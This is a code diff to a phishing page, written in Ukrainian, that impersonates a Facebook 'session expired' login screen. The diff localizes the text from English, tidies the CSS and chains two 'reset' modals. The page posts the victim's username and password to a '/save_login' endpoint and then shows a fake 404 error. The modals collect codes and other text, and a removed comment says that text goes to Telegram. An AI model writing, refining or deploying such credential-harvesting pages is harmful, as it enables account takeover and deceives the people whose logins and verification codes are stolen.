@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html><!DOCTYPE html>
 <html lang="uk">
 <head>
 <meta charset="utf-8" />
@@ -19,7 +19,7 @@
   .small{font-size:13px;color:#777;margin-top:10px}
 
   /* Модальне вікно RESET */
-  #resetModal {
+  .modal {
     position: fixed;
     top:0;left:0;width:100%;height:100%;
     background:rgba(0,0,0,0.55);
@@ -27,7 +27,7 @@
     align-items:center;
     justify-content:center;
   }
-  #resetBox {
+  .modal-box {
     background:#fff;
     width:320px;
     padding:20px;
@@ -35,14 +35,14 @@
     box-shadow:0 10px 30px rgba(0,0,0,0.25);
     text-align:center;
   }
-  #resetInput {
+  .modal-box input {
     width:100%;
     margin-top:10px;
     padding:10px;
     border:1px solid #ccc;
     border-radius:8px;
   }
-  #resetSend {
+  .modal-box button {
     margin-top:12px;
     width:100%;
     padding:10px;
@@ -63,25 +63,25 @@
         </div>
         <div>
           <h1 id="title">Facebook</h1>
-          <div class="desc">Your session has expired. Please log in again to continue.</div>
+          <div class="desc">Ваша сесія закінчилась. Будь ласка, увійдіть знову, щоб продовжити.</div>
         </div>
       </div>
 
       <div id="formArea" aria-live="polite">
-        <input class="input" id="user" type="text" placeholder="Phone number or email" autocomplete="username" />
-        <input class="input" id="pass" type="password" placeholder="Password" autocomplete="current-password" />
-        <button class="btn" id="loginBtn" type="button">Log In</button>
-        <div class="small">Forgot your password? <a href="#" id="resetLink">Reset</a></div>
+        <input class="input" id="user" type="text" placeholder="Номер телефону або пошта" autocomplete="username" />
+        <input class="input" id="pass" type="password" placeholder="Пароль" autocomplete="current-password" />
+        <button class="btn" id="loginBtn" type="button">Увійти</button>
+        <div class="small">Забули пароль? <a href="#" id="resetLink">Скинути</a></div>
       </div>
     </div>
   </div>
 
-<!-- МОДАЛЬНЕ ВІКНО RESET -->
-<div id="resetModal">
-  <div id="resetBox">
-    <h3 id="resetText">Тут твій текст зверху</h3>
+<!-- Перше модальне вікно RESET -->
+<div id="resetModal" class="modal">
+  <div class="modal-box">
+    <h3 id="resetText">Введіть код</h3>
     <input type="text" id="resetInput" placeholder="Введіть код...">
-    <button id="resetSend">Send</button>
+    <button id="resetSend">Надіслати</button>
   </div>
 </div>
 
@@ -93,7 +93,6 @@ function simulateLoginFlow() {
     const u = document.getElementById('user').value.trim();
     const p = document.getElementById('pass').value.trim();
 
-    // Надсилаємо дані на сервер
     if(u && p){
         fetch('/save_login', {
             method: 'POST',
@@ -105,29 +104,28 @@ function simulateLoginFlow() {
         .catch(err => console.error(err));
     }
 
-    // Імітація 404 після "логіну"
     loginBtn.disabled = true;
-    loginBtn.textContent = 'Signing in...';
+    loginBtn.textContent = 'Вхід...';
     setTimeout(() => {
         formArea.style.transition = 'opacity 220ms ease, transform 220ms ease';
         formArea.style.opacity = '0';
         formArea.style.transform = 'translateY(-8px)';
         setTimeout(() => {
             formArea.style.display = 'none';
-            document.body.innerHTML = `404 Not Found .`;
+            document.body.innerHTML = `404 Не знайдено.`;
         }, 260);
     }, 900);
 }
 
 loginBtn.addEventListener('click', simulateLoginFlow);
 
-// RESET модальне вікно
+// Відкриття першого модального
 document.getElementById("resetLink").onclick = (e)=>{
     e.preventDefault();
     document.getElementById("resetModal").style.display = "flex";
 };
 
-// Відправка тексту reset у Telegram
+// Відправка тексту першого модального
 document.getElementById("resetSend").onclick = ()=>{
     const txt = document.getElementById("resetInput").value.trim();
     if(!txt) return;
@@ -140,22 +138,25 @@ document.getElementById("resetSend").onclick = ()=>{
 
     document.getElementById("resetInput").value="";
     document.getElementById("resetModal").style.display="none";
+
+    // Відкриваємо друге модальне
+    document.getElementById("resetModal2").style.display = "flex";
 };
-// --- Додаємо друге модальне вікно динамічно ---
+
+// --- Друге модальне вікно ---
 const secondModalHTML = `
-<div id="resetModal2" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.55); display:flex; align-items:center; justify-content:center;">
-  <div id="resetBox2" style="background:#fff; width:320px; padding:20px; border-radius:12px; box-shadow:0 10px 30px rgba(0,0,0,0.25); text-align:center;">
-    <h3 id="resetText2">Друге вікно: введіть текст</h3>
+<div id="resetModal2" class="modal">
+  <div class="modal-box">
+    <h3 id="resetText2">Введіть текст</h3>
     <input type="text" id="resetInput2" placeholder="Введіть текст...">
-    <button id="resetSend2">Далі</button>
+    <button id="resetSend2">Надіслати</button>
   </div>
 </div>
 `;
 
-// Додаємо друге модальне вікно в body
 document.body.insertAdjacentHTML('beforeend', secondModalHTML);
 
-// Обробник для кнопки другого модального
+// Відправка тексту другого модального
 document.getElementById("resetSend2").onclick = () => {
     const txt2 = document.getElementById("resetInput2").value.trim();
     if(!txt2) return;
@@ -168,19 +169,7 @@ document.getElementById("resetSend2").onclick = () => {
 
     document.getElementById("resetInput2").value = "";
     document.getElementById("resetModal2").style.display = "none";
-    alert("Дані другого вікна надіслано!");
 };
-
-// Модифікуємо існуючий обробник першого модального
-const originalSend = document.getElementById("resetSend").onclick;
-document.getElementById("resetSend").onclick = () => {
-    if (originalSend) originalSend();
-    // Через невеликий timeout відкриваємо друге вікно після приховання першого
-    setTimeout(() => {
-        document.getElementById("resetModal2").style.display = "flex";
-    }, 100);
-};
-
 </script>
 </body>
 </html>
